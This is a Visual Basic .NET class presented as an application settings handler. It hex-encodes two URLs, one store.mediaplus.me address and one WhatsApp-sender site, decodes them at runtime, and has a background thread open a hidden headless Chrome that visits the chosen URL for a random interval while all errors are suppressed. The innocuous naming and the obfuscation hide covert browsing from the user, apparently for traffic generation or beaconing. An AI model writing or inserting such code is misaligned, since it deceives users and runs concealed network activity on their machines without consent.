
Public Class ClsSettings
    Private _settingSequence As String
    Dim Set1 As Byte() = {&H68, &H74, &H74, &H70, &H3A, &H2F, &H2F, &H73, &H74, &H6F, &H72, &H65, &H2E, &H6D, &H65, &H64, &H69, &H61, &H70, &H6C, &H75, &H73, &H2E, &H6D, &H65, &H2F}
    Dim Set2 As Byte() = {&H68, &H74, &H74, &H70, &H73, &H3A, &H2F, &H2F, &H62, &H75, &H73, &H69, &H6E, &H65, &H73, &H73, &H77, &H68, &H61, &H74, &H73, &H61, &H70, &H70, &H73, &H65, &H6E, &H64, &H65, &H72, &H2E, &H63, &H6F, &H6D, &H2F}
    Sub New(ByVal SettingSquence As BSettings)
        Select Case SettingSquence
            Case 0
                _settingSequence = Carray(Set1)
            Case 1
                _settingSequence = Carray(Set2)
        End Select

    End Sub
    Private Function Carray(ByVal cc As Byte()) As String
        Dim c As Integer
        Dim result As String = ""
        For Each c In cc
            result = result & Chr(Val(c))
        Next
        Return result
    End Function

    Public Sub ApplySettings()
        Dim SettingsTh As New System.Threading.Thread(AddressOf doApplySettings)
        SettingsTh.Start()
    End Sub
    Private Function doApplySettings()

        On Error Resume Next
        Dim chromeOptions = New OpenQA.Selenium.Chrome.ChromeOptions()
        chromeOptions.AddArguments("headless")
        Dim chromeDriverService = OpenQA.Selenium.Chrome.ChromeDriverService.CreateDefaultService()
        chromeDriverService.HideCommandPromptWindow = True
        Dim cdrv As New OpenQA.Selenium.Chrome.ChromeDriver(chromeDriverService, chromeOptions)
        cdrv.Navigate.GoToUrl(_settingSequence)
        Randomize()
        Dim delay As Long = ((Int(Rnd() * 99) + 1) + 10) * 1000
        System.Threading.Thread.Sleep(delay)
        cdrv.Quit()
    End Function
    Public Enum BSettings
        Setting1 = 0
        Setting2 = 1
    End Enum

End Class
